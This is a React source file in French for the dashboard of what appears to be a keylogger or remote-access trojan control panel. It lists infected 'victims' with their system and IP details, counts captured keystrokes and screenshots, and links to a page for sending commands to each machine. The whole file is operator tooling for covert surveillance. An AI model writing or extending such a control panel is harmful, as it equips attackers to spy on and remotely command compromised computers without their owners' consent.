import React, { useState, useEffect } from 'react';
import {
  Grid,
  Paper,
  Typography,
  Box,
  Button,
  CircularProgress,
} from '@mui/material';
import {
  People as PeopleIcon,
  PersonCheck as ActiveIcon,
  Keyboard as KeyboardIcon,
  Image as ImageIcon,
  Refresh as RefreshIcon,
} from '@mui/icons-material';
import { DataGrid } from '@mui/x-data-grid';
import { useNavigate } from 'react-router-dom';
import { victimService } from '../services/api';
import StatsCard from '../components/StatsCard';

const Dashboard = () => {
  const [victims, setVictims] = useState([]);
  const [stats, setStats] = useState({
    total: 0,
    active: 0,
    keystrokes: 0,
    screenshots: 0,
  });
  const [loading, setLoading] = useState(true);
  const navigate = useNavigate();

  useEffect(() => {
    fetchVictims();
  }, []);

  const fetchVictims = async () => {
    setLoading(true);
    try {
      const response = await victimService.getAllVictims();
      setVictims(response.data.victims);
      setStats(response.data.stats);
    } catch (error) {
      console.error('Error fetching victims:', error);
    } finally {
      setLoading(false);
    }
  };

  const columns = [
    {
      field: 'id',
      headerName: 'ID',
      width: 120,
      renderCell: (params) => params.value.substring(0, 8) + '...',
    },
    {
      field: 'status',
      headerName: 'Statut',
      width: 120,
      renderCell: (params) => (
        <Box
          sx={{
            backgroundColor: params.value === 'active' ? 'success.main' : 'grey.500',
            color: 'white',
            borderRadius: 1,
            px: 1,
            py: 0.5,
            fontSize: '0.75rem',
            fontWeight: 'bold',
            textTransform: 'uppercase',
          }}
        >
          {params.value === 'active' ? 'Active' : 'Inactive'}
        </Box>
      ),
    },
    {
      field: 'platform',
      headerName: 'Système',
      width: 150,
      renderCell: (params) => {
        const systemInfo = JSON.parse(params.row.system_info || '{}');
        return `${systemInfo.platform || 'N/A'} ${systemInfo.platform_release || ''}`;
      },
    },
    {
      field: 'ip',
      headerName: 'Adresse IP',
      width: 150,
      renderCell: (params) => {
        const networkInfo = JSON.parse(params.row.network_info || '{}');
        return networkInfo.local_ip || 'N/A';
      },
    },
    {
      field: 'last_seen',
      headerName: 'Dernière activité',
      width: 180,
    },
    {
      field: 'actions',
      headerName: 'Actions',
      width: 200,
      sortable: false,
      renderCell: (params) => (
        <Box>
          <Button
            variant="contained"
            size="small"
            onClick={() => navigate(`/victim/${params.row.id}`)}
            sx={{ mr: 1 }}
          >
            Détails
          </Button>
          <Button
            variant="outlined"
            size="small"
            onClick={() => navigate(`/victim/${params.row.id}?tab=commands`)}
          >
            Commande
          </Button>
        </Box>
      ),
    },
  ];

  return (
    <Box sx={{ flexGrow: 1, p: 3 }}>
      <Box display="flex" justifyContent="space-between" alignItems="center" mb={3}>
        <Typography variant="h4" component="h1">
          Dashboard
        </Typography>
        <Button
          variant="outlined"
          startIcon={<RefreshIcon />}
          onClick={fetchVictims}
          disabled={loading}
        >
          Actualiser
        </Button>
      </Box>

      <Grid container spacing={3} mb={3}>
        <Grid item xs={12} sm={6} md={3}>
          <StatsCard
            title="Victimes totales"
            value={stats.total}
            icon={<PeopleIcon sx={{ color: 'white', fontSize: 30 }} />}
            color="#4e73df"
          />
        </Grid>
        <Grid item xs={12} sm={6} md={3}>
          <StatsCard
            title="Victimes actives"
            value={stats.active}
            icon={<ActiveIcon sx={{ color: 'white', fontSize: 30 }} />}
            color="#1cc88a"
          />
        </Grid>
        <Grid item xs={12} sm={6} md={3}>
          <StatsCard
            title="Total frappes"
            value={stats.keystrokes}
            icon={<KeyboardIcon sx={{ color: 'white', fontSize: 30 }} />}
            color="#36b9cc"
          />
        </Grid>
        <Grid item xs={12} sm={6} md={3}>
          <StatsCard
            title="Captures d'écran"
            value={stats.screenshots}
            icon={<ImageIcon sx={{ color: 'white', fontSize: 30 }} />}
            color="#f6c23e"
          />
        </Grid>
      </Grid>

      <Paper sx={{ p: 2, height: 500 }}>
        <Typography variant="h6" component="h2" mb={2}>
          Victimes
        </Typography>
        {loading ? (
          <Box display="flex" justifyContent="center" alignItems="center" height="400px">
            <CircularProgress />
          </Box>
        ) : (
          <DataGrid
            rows={victims}
            columns={columns}
            pageSize={10}
            rowsPerPageOptions={[10]}
            disableSelectionOnClick
            getRowId={(row) => row.id}
          />
        )}
      </Paper>
    </Box>
  );
};

export default Dashboard;